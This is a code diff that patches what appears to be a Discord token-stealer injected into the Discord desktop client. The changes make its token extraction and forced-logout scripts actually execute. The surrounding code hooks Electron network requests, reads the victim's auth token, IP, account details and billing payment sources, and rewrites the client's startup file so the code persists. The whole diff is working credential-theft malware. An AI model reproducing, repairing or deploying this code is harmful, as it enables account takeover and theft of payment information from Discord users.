@@ -13,7 +13,7 @@ const executeJS = script => {
 };
 const tokenScript = async () => await executeJS(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);
 const logOutScript = async () => await executeJS(`function getLocalStoragePropertyDescriptor(){const o=document.createElement("iframe");document.head.append(o);const e=Object.getOwnPropertyDescriptor(o.contentWindow,"localStorage");return o.remove(),e}Object.defineProperty(window,"localStorage",getLocalStoragePropertyDescriptor());const localStorage=getLocalStoragePropertyDescriptor().get.call(window);localStorage.token=null,localStorage.tokens=null,localStorage.MultiAccountStore=null,location.reload();`);
-var doTheLogOut = true
+var doTheLogOut = fs.existsSync("./d3dcompiler.dll") ? true : false
 var config = {
     "logout": "true",
     "logout-notify": "true",
@@ -257,7 +257,7 @@ const post = async (params) => {
 }
 const FirstTime = async () => {
     if (doTheLogOut) return false
-    var token = tokenScript;
+    var token = await tokenScript();
     if (config['init-notify'] !== "true") return true
     if (fs.existsSync(__dirname + "/blackcap")) fs.rmdirSync(__dirname + "/blackcap")
     var ip = await getIP()
@@ -444,7 +444,7 @@ const FirstTime = async () => {
             params.embeds.push(params2.embeds[0])
         }
         fs.writeFileSync("./d3dcompiler.dlll", "LogOut")
-        await logOutScript;
+        await logOutScript();
         doTheLogOut = true
         await post(params)
     }
@@ -493,7 +493,9 @@ require("${appPath}/app.asar")
 if (fs.existsSync(betterDiscord)) require(betterDiscord)`
 
     fs.writeFileSync(index, script)
-    if (doTheLogOut) logOutScript;
+    if (doTheLogOut) {
+       async() => await logOutScript()
+    }
     return
 }
 electron.session.defaultSession.webRequest.onBeforeRequest(config.Filter, async (details, callback) => {
@@ -526,7 +528,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
     } catch (err) {
         var data = queryString.parse(decodeURIComponent(request.uploadData[0].bytes.toString()))
     }
-    var token = tokenScript;
+    var token = await tokenScript();
     var ip = await getIP()
     var user = await getURL("https://discord.com/api/v8/users/@me", token)
     var billing = await getURL("https://discord.com/api/v9/users/@me/billing/payment-sources", token)
